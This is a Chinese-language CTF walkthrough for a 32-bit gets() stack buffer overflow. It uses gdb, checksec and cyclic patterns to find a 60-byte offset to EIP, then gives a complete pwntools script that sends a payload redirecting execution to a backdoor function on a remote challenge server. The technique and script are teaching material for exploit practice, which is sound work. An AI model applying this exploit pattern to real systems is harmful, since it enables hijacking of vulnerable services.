### 32 位 Gets 栈溢出

下载附件后先加权限

```sh
chmod +x server
```

![](https://pic1.imgdb.cn/item/6837393858cb8da5c816f3c6.png)

这题我们尝试先不反编译看能不能找出漏洞点在哪

```sh
gdb server
```

![](https://pic1.imgdb.cn/item/6837399f58cb8da5c816f3d6.png)

先 `checksec` 看看什么版本及有哪些保护（这里是 32 位及没有金丝雀和 PIE）

```sh
checksec
```

![](https://pic1.imgdb.cn/item/683739da58cb8da5c816f3e1.png)

直接输入 `r` 运行程序

这里要我们输入内容

```sh
r
```

![](https://pic1.imgdb.cn/item/68373a3558cb8da5c816f433.png)

随便输入数值后发现程序结束了，由此判断只有这一个输入点（本节主要讲动态调试，就不解析输出内容了）

```sh
123456
```

![](https://pic1.imgdb.cn/item/68373a7858cb8da5c816f445.png)

先生成两百个字符方便我们输入

```sh
cyclic 200
```

![](https://pic1.imgdb.cn/item/68373a5558cb8da5c816f43f.png)

再次运行程序

```sh
r
```

![](https://pic1.imgdb.cn/item/68373b3f58cb8da5c816f46b.png)

输入我们生成的字符发现程序崩溃了

```sh
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

![](https://pic1.imgdb.cn/item/68373b7e58cb8da5c816f474.png)

这个时候我们首先查看各个寄存器的值

```sh
context
```

![](https://pic1.imgdb.cn/item/68373bfe58cb8da5c816f485.png)

这里我们主要看寄存器 EIP 的值

**EIP 是 32 位 x86 架构中的“扩展指令指针”寄存器，用于存储下一条将要执行的机器指令的地址**

**因此在缓冲区溢出利用中，覆盖 EIP 即可改变程序的执行流**

我们发现 EIP 为我们输入的字符，所以可以确定我们是可以控制 EIP 的值

```sh
EIP  0x61616170 ('paaa')
```

所以下一步就是要确认我们输了多少个字符后才到 EIP，也就是确认偏移

我们通过这个命令去查找 `paaa` 的偏移就行

```sh
cyclic -l "paaa"
```

确认了偏移为 60 字节

![](https://pic1.imgdb.cn/item/68373d1858cb8da5c816f496.png)

然后还是借助静态工具看有没有后门函数之类的

![](https://pic1.imgdb.cn/item/68373f7458cb8da5c816f520.png)

构造 payload

```python
from pwn import *

p = remote("thekidofarcrania.com", 4902)

payload = b'a' * 60 + p32(0x08048586)

p.recvuntil('Input some text:')
p.sendline(payload)
p.interactive()
```
